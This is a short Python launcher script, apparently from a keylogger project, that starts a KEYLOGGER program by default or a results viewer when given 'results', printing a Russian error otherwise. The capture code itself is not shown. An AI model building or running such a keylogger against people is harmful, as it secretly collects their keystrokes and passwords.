#!/usr/bin/env python
import sys

from start.setup import get_program, ProgramType


def main():
    if len(sys.argv) == 1:
        program = get_program(ProgramType.KEYLOGGER)
    elif sys.argv[1] == 'results':
        program = get_program(ProgramType.RESULTS)
    else:
        return print('Неправильный аргумент %s' % sys.argv[1])

    program.start()


if __name__ == '__main__':
    main()
